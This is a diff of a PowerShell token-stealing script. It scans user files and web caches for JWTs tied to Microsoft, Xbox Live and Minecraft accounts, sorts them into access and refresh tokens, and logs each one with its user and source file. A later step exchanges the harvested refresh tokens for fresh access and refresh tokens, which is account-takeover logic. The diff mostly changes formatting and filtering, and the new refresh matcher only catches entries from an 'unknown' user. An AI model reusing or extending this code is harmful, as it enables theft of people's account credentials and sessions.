@@ -13,7 +13,6 @@ $found = @()
 $seen = @{}
 
 $jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
-$jweRegex = "eyJhbGciOiJSU0EtT0FFUC[A-Za-z0-9_\-\.]{100,}"
 
 function Add-Token {
     param($tok, $user, $src, $type)
@@ -23,14 +22,27 @@ function Add-Token {
     $key = "$type|$tok"
     if($seen.ContainsKey($key)){ return }
     $seen[$key] = $true
-    $script:found += "user: $user`ntype: $type`n$type`: $tok`nfile: $src`n"
+
+    $short = $type -replace "Token",""
+    $script:found += @"
+[$short] $user
+  token: $tok
+  file:  $src
+"@
 }
 
 function Scan-Text {
     param($text, $src, $user)
     if(-not $text){ return }
-    [regex]::Matches($text, $jwtRegex) | %{ Add-Token $_.Value $user $src "accessToken" }
-    [regex]::Matches($text, $jweRegex) | %{ Add-Token $_.Value $user $src "encryptedToken" }
+    [regex]::Matches($text, $jwtRegex) | %{
+        $val = $_.Value
+        # skip encrypted JWE wrappers, they aint usable
+        if($val.StartsWith("eyJhbGciOiJSU0EtT0FFUC")){ return }
+        # access tokens contain the minecraft client id + xuid pattern
+        if($val -match "eE1pY3Jvc29mdA|MBI_SSL|XboxLive"){ Add-Token $val $user $src "accessToken" }
+        elseif($val -match "refresh"){ Add-Token $val $user $src "refreshToken" }
+        else{ Add-Token $val $user $src "token" }
+    }
 }
 
 function Scan-File {
@@ -227,7 +239,7 @@ foreach($lc in $webcaches){
     }catch{}
 }
 
-# ---------- 6. refresh every refresh token into fresh access token ----------
+# ---------- 6. refresh tokens ----------
 function Refresh-Token {
     param($refreshTok)
     try{
@@ -246,11 +258,15 @@ function Refresh-Token {
 
 $refreshed = @()
 foreach($line in $found){
-    if($line -match "type: refreshToken`nrefreshToken: ([^\n]+)"){
+    if($line -match "\[refresh\] unknown`n  token: ([^\n]+)"){
         $rt = $matches[1].Trim()
         $new = Refresh-Token $rt
         if($new){
-            $refreshed += "old refresh: $rt`nnew access: $($new.access)`nnew refresh: $($new.refresh)`n"
+            $refreshed += @"
+[refreshed] from old refresh
+  new access:  $($new.access)
+  new refresh: $($new.refresh)
+"@
         }
     }
 }
